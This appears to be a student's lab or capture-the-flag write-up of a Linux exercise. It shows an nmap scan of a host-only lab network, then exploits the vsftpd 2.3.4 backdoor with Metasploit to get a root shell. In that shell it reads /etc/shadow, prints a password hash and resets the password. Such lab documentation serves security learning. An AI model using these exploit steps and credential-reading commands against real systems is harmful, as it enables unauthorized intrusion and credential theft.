# Level 1 (Linux)

## nmap scan results

```
user@DESKTOP-NLRK5D7:~$ nmap -A 192.168.56.1/24
Nmap scan report for 192.168.56.100
Host is up (0.87s latency).
All 1000 scanned ports on 192.168.56.100 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (3 hosts up) scanned in 168.24 seconds
```

## attemp 1: Use vsFTPd 2.3.4 bug: The attacker replaced the legitimate vsftpd-2.3.4.tar.gz archive with a malicious version.  

use exploit/unix/ftp/vsftpd_234_backdoor  

set RHOSTS to target ip

exploit --job

Interact with session: session –l && session -i 1

Get password hash cat /etc/shadow

```
$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
```


```
sessions ls

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  2         shell cmd/unix               172.18.253.133:44789 -> 192.168.56.3:6200 (192.168.56.3)

msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 1
[-] Invalid session identifier: 1
msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -i 2
[*] Starting interaction with 2...

passwd
Enter new UNIX password: 0000
Retype new UNIX password: 0000
passwd: password updated successfully
sudo apt update
sudo: apt: command not found
sudo -s
whoami
root
```